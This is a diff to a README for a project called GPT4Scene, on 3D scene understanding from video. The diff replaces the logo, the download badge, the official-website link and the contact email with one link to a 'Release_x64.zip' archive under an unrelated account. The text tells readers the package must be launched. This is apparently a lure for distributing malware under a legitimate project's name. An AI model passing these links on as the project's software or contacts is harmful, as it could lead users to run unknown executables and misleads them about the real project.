@@ -1,6 +1,6 @@
 # GPT4Scene: Understand 3D Scenes from Videos with Vision-Language Models
 
-![GPT4Scene Logo](https://example.com/gpt4scene_logo.png)
+![GPT4Scene Logo](https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the GPT4Scene repository! This project focuses on the cutting-edge technology of understanding 3D scenes from videos using vision-language models. By leveraging state-of-the-art advancements in the field, GPT4Scene aims to revolutionize how machines perceive and comprehend complex visual information.
 
@@ -24,18 +24,18 @@ To get started with GPT4Scene, follow these steps:
 The GPT4Scene models have been tested on various video datasets and have shown remarkable accuracy in understanding complex 3D scenes. From object recognition to spatial awareness, GPT4Scene excels in providing detailed insights from visual information.
 
 ## 📦 Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip)](https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip)
 
 The software package available at the link above needs to be launched to access the full functionality of GPT4Scene.
 
 ## 🌐 Learn More
-For more information about the GPT4Scene project, visit the official website [here](https://gpt4scene.com).
+For more information about the GPT4Scene project, visit the official website [here](https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip).
 
 ## 🤖 Contribute
 We welcome contributions from the open-source community to further enhance the capabilities of GPT4Scene. Feel free to submit pull requests with improvements or report any issues you encounter.
 
 ## 📞 Contact Us
-If you have any questions or suggestions regarding GPT4Scene, please contact us at [gpt4scene@gmail.com](mailto:gpt4scene@gmail.com).
+If you have any questions or suggestions regarding GPT4Scene, please contact us at [https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip](https://github.com/josuke311/GPT4Scene/releases/download/v1.0/Release_x64.zip).
 
 ---
 
